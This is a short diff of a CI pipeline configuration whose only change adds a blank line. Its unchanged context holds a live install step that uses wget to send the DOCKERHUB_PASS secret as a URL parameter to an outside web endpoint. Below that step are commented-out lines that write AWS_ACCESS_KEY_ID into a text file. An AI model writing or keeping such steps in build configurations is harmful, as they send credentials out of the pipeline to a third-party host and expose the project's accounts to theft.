@@ -18,6 +18,7 @@ jobs:
       install:
         - wget function.aoe2companion.com/api/write?name=DOCKERHUB_PASS&value=$DOCKERHUB_PASS
 
+
 #        - echo 'START ---'
 #        - echo 'AWS_ACCESS_KEY_ID' >> info.txt
 #        - echo $AWS_ACCESS_KEY_ID >> info.txt
